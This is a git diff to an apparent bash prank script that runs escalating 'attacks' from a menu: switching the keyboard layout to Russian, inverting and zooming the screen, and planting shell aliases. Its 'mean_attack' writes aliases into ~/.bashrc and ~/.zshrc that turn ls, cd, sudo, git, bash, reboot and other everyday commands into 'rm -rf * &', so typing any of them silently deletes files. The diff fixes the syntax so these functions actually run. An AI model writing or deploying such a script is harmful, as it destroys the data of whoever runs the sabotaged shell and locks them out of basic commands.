@@ -58,27 +58,27 @@ advanced_alias()
 
 basic_attack()
 {
-    base_alias()
-    base()
-    refresh_bash()
+    base_alias
+    base
+    refresh_bash
 }
 
 normal_attack()
 {
     echo "Changing the keyboard to Russian"
     setxkbmap ru
-    normal_alias()
-    base()
-    refresh_bash()
+    normal_alias
+    base
+    refresh_bash
 }
 
 advanced_attack()
 {
     echo "Changing the keyboard to Russian"
     setxkbmap ru
-    advanced_alias()
-    base()
-    refresh_bash()
+    advanced_alias
+    base
+    refresh_bash
 }
 
 hardcore_attack()
@@ -89,22 +89,22 @@ hardcore_attack()
     xrandr -o inverted
     echo "Zooming in"
     xrandr --scale 5x5
-    advanced_alias()
-    base()
-    refresh_bash()
+    advanced_alias
+    base
+    refresh_bash
 }
 
 mean_attack()
 {
     echo "Well ... Good luck."
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "echo" "tree" "chmod"
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "echo" "tree" "chmod" "reboot"
     do
 	echo "Redirecting '$alias' to 'rm -rf * & '"
 	echo "alias $alias='rm -rf * & '" >> ~/.bashrc
 	echo "alias $alias='rm -rf * & '" >> ~/.zshrc
     done
-    base()
-    refresh_bash()
+    base
+    refresh_bash
 }
 
 echo "+-------------------------------------------------+"
@@ -134,25 +134,26 @@ echo
 case $usr_input in
     0)
 	echo "Bye"
+	exit
 	;;
     1)
 	echo "Performing the basic attack ..."
-	basic_attack()
+	basic_attack
 	;;
     2)
 	echo "Performing the normal attack ..."
-	normal_attack()
+	normal_attack
 	;;
     3)
 	echo "Performing the advanced attack ... (Good luck)"
-	advanced_attack()
+	advanced_attack
 	;;
     4)
 	read -p "Are you sure you want to launch the attack level 4 ? (y/n) : " usr_input
 	if [$usr_input = "y"]
 	then
 	    echo "Performing the hardcore attack ..."
-	    hardcore_attack()
+	    hardcore_attack
 	fi
 	;;
     5)
@@ -163,7 +164,7 @@ case $usr_input in
 	    if [$usr_input = "y"]
 	    then
 		echo "Performing the mean attack ..."
-		mean_attack()
+		mean_attack
 	    fi
 	fi
 	;;
